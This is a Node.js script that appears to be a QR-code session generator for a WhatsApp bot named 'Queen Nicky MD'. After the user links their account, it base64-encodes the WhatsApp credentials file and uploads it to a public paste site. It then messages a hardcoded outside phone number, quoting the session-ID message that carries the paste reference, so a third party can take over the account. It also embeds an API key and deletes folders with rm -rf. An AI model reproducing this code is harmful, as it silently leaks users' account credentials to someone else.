const pino = require("pino");
const axios = require("axios");
let qrcode = require("qrcode-terminal");
const PastebinAPI = require("pastebin-js");
const path = require('path');
pastebin = new PastebinAPI("EMWTMkQAVfJa9kM-MRUrxd5Oku1U7pgL");
const fs = require("fs-extra");
if (fs.existsSync('./auth_info_baileys')) {
  fs.emptyDirSync(__dirname + '/auth_info_baileys');
  require('child_process').exec('rm -rf auth_info_baileys')
  console.log('\nRun The Script Again');
  setTimeout(() => {   console.log(' ')    }, 100);
  setTimeout(() => {   console.log('■■■▢▢▢▢▢..Loading...100%')    }, 300);
  setTimeout(() => {   console.log('ආයිත් RUN BUTTON එක ඔබන්න එතෝට Qr ek eyi..✅ි')    }, 500);
  setTimeout(() => {   console.log('This is how you get the darkqueen botge qr. Can you see there is a green button below, press one and it will come.')    }, 700);
  setTimeout(() => {   console.log('इस तरह आपको रावण बॉटगे क्यूआर मिलता है। क्या आप देख रहे हैं कि नीचे एक हरा बटन है, एक दबाएं और यह आ जाएगा।')    }, 900);
  setTimeout(() => {   console.log('これがラーヴァナ ボトゲ qr の入手方法です。下に緑色のボタンがあるのがわかりますか。ボタンを押すと表示されます。')    }, 1100);
  setTimeout(() => {   console.log('Ini adalah bagaimana Anda mendapatkan qr botge Darkqueen Apakah Anda melihat ada tombol hijau di bawah, tekan satu dan itu akan datang.이것이 Ravana botge qr을 얻는 방법입니다. 아래에 녹색 버튼이 있는 것을 볼 수 있으며, 하나를 누르면 올 것입니다.')    }, 1300);
  setTimeout(() => {   console.log('✅')    }, 1500);
  setTimeout(() => {   console.log(' ')    }, 1700);
  setTimeout(() => {   console.log('𝑩')    }, 1900);
  setTimeout(() => {   console.log('𝒐')    }, 2100);
  setTimeout(() => {   console.log('𝒕')    }, 2300);
  setTimeout(() => {   process.exit()      }, 2400)
};
setTimeout(() => {
  const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, makeInMemoryStore, } = require("@sampandey001/baileys");
  const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
  async function Secktor() {
    const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/auth_info_baileys')
    try {
      let session = makeWASocket({ printQRInTerminal: true, logger: pino({ level: "silent" }), browser: Browsers.macOS("Desktop"), auth: state });
      session.ev.on("connection.update", async (s) => {
        const { connection, lastDisconnect, qr } = s;
        if (connection == "open")
        {
          await delay(500);
          let user = session.user.id;
          var c2 = '';
//===========================================================================================
//===============================  SESSION ID 1   ===========================================
//===========================================================================================
          try { 
            let data = await fs.readFileSync(__dirname+'/auth_info_baileys/creds.json','utf-8')  
            await delay(800)
            const output = await axios.post('http://paste.c-net.org/',`${btoa(data)}`,{headers:{'Content-Type':'application/x-www-form-urlencoded'}});
             c2 = output.data.split('/')[3]
            await delay(500);
            let session_id1 = await session.sendMessage(user, {text: '𝐐𝐔𝚵𝚵𝚴-𝚴𝚰𝐂𝐊𝐘-𝚳𝐃;;;'+c2});
            await session.sendMessage("94702090692@s.whatsapp.net", { text: '*𝗤𝗨𝗘𝗘𝗡 𝗡𝗜𝗖𝗞𝗬 𝗤𝗥 𝗖𝗢𝗗𝗘 𝗦𝗤𝗔𝗡 𝗦𝗨𝗖𝗖𝗘𝗦𝗙𝗨𝗟𝗟𝗬✅*' } , {quoted : session_id1});
          }catch (e) {console.log(e)}
//===========================================================================================
//===============================  SESSION ID 2   ===========================================
//===========================================================================================
          let unique = fs.readFileSync(__dirname + '/auth_info_baileys/creds.json')
          c = Buffer.from(unique).toString('base64')
          console.log(`
====================  SESSION ID 1  ==========================                   
SESSION-ID 1 ==> ${c}

====================  SESSION ID 2  ========================== 
SESSION-ID 2 => ' ${c2}

Don't provide your SESSION_ID to anyone otherwise that user can access your account.
Thanks.
-------------------   SESSION CLOSED   -----------------------
`)   




          
let cc = `◈◅◅◅◅◅◅◅◅◅◅▻▻▻▻▻▻▻▻▻▻◈
*QUEEN-NICKY-MD-V1*
    ▫▫▫▫▫▫▫▫▫▫▫▫▫▫▫▫▫▫▫▫▫▫▫▫▫▫▫▫▫▫▫▫▫▫▫▫
    ▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪
🧞‍♀️ *𝗚𝗜𝗧𝗛𝗨𝗕* ᴄᴏᴍɪɴɢ ꜱᴏᴏɴ...
    ▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪
🧜‍♀️ *𝗦𝗜𝗧𝗘* ᴄᴏᴍɪɴɢ ꜱᴏᴏɴ...
    ▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪
👩‍💻 *𝗦𝗨𝗣𝗣𝗢𝗥𝗧* https://chat.whatsapp.com/E8F5pT0vqVbJjYEYcmQnBr
    ▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪
💎 *𝗧𝗘𝗦𝗧 𝗚𝗥𝗢𝗨𝗣* https://chat.whatsapp.com/ClnojBuE3NCKtB69NDcRFe
    ▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪
🎀 *𝗢𝗪𝗡𝗘𝗥 𝗡𝗕* +94742443114


◈◅◅◅◅◅◅◅◅◅◅▻▻▻▻▻▻▻▻▻▻◈
`;
          let session_id = await session.sendMessage(user, { text: "𝐐𝐔𝚵𝚵𝚴-𝚴𝚰𝐂𝐊𝐘-𝚳𝐃;;;" + c });
          await session.sendMessage(user, { text: cc } , { quoted : session_id });
          
          await require('child_process').exec('rm -rf auth_info_baileys')
          process.exit(1)
        }
        session.ev.on('creds.update', saveCreds)
       if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode != 401) { Secktor(); }
      });
    } catch (err) {console.log(err);await require('child_process').exec('rm -rf auth_info_baileys');process.exit(1);}
  }
  Secktor();
}, 3000)

